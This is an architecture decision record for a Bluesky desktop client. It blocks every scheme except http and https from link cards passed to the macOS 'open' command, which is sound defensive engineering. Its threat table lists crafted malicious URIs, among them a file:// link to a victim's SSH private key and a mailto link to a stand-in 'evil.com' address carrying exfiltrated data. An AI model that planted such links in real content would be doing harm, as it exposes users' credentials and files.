# ADR-002 · Safe-Open Allowlist (http/https only)

#decisions

**Status**: Accepted (1.0)
**Date**: 2026-05-25

---

## Context

Smooblue renders external embeds — link cards attached to posts. Each card has a clickable surface that opens the URL in the user's default browser. On macOS we shell out:

```rust
std::process::Command::new("open").arg(&url).spawn();
```

`open` is the user-facing entry point for **any** URL scheme registered on the system. It will happily fire `file://`, `mailto:`, `slack://`, `vscode://`, `zoommtg://`, custom protocol handlers registered by any installed app — anything.

The URLs we pass to `open` come from `EmbedExternal.uri`. That field is set by whoever published the post. **Anyone who can post to bsky can craft a link card with an arbitrary URI.**

---

## The risk

A malicious post in a Discover feed (or any feed) ships an `external` embed with:

| Crafted URI | What happens on click |
| --- | --- |
| `file:///Users/<victim>/.ssh/id_rsa` | Preview.app opens and renders the private key contents |
| `file:///etc/hosts` | TextEdit opens with system file contents |
| `mailto:phish@evil.com?subject=…&body=<your-exfiltrated-data>` | Mail.app pops a pre-composed email |
| `slack://team-X/channel-Y` | Deep-link into the victim's Slack workspace |
| `vscode://file/etc/hosts` | VS Code opens with the system file |
| Custom URL handler for any installed app | Native action in that app |

One click. No prompt. The attacker doesn't need any privilege — just the ability to publish a public post.

---

## Decision

All `open` call sites that take a network-controlled URL go through `crate::safe_open::open_in_browser(url)`. The helper:

1. Parses with `url::Url::parse`
2. Allowlists `http` and `https` schemes — everything else is silently blocked (`Ok(false)` returned; click effectively a no-op)
3. Then dispatches to the platform-appropriate browser-launcher (`open` on macOS, `cmd /C start` on Windows, `xdg-open` on Linux)

Allowlist > blocklist, on principle. New URL schemes ship faster than we update.

---

## Sites covered

| File | What was clicked |
| --- | --- |
| `components/embed.rs` `LinkCard` | External embed URI (the worst offender — attacker-controlled) |
| `components/embed.rs` `ImageTile` | CDN fullsize URL (low risk; defensive) |
| `components/post.rs` timestamp permalink | bsky.app URL we built ourselves (defensive) |
| `components/deck.rs` update-toast | GitHub release URL we got from the API (defensive) |
| `views/login.rs` OAuth browser launch | Our own authorize URL (defensive) |

`components/settings_sheet.rs` reveals the user's own config dir via `open <path>` — that's a filesystem path, not a URL, and the path is first-party. Left as raw `open`.

---

## Consequences

**Pro:**
- One regression-test surface (`safe_open` unit tests cover the allowlist)
- No silent privilege escalation through any installed app's URL handler
- Future cross-platform port doesn't change the threat model

**Con:**
- A user who legitimately wants to click an `ftp://` link in someone's bio can't. We think this trade-off is correct; if it ever bites, we can add a "click again to allow" toast.
- Slight loss of native macOS feel — `tel:` and `facetime:` links from posts won't fire.

---

## Alternatives considered

| Option | Why not |
| --- | --- |
| Blocklist of "known bad" schemes | Whack-a-mole. New schemes register all the time. |
| Pop a "open URL in browser?" confirmation dialog | Click-fatigue → user clicks through; we'd lose the defense. |
| Render the URL but require the user to copy-paste | Defeats the embed card's purpose. |
| Strip the scheme and force https | Mangles legitimate FTP/SSH/etc., still doesn't defend `file://` because that has no host to substitute. |

---

## Related

- [[../Architecture/Architecture-Overview]]
- `crates/smooblue-app/src/safe_open.rs`
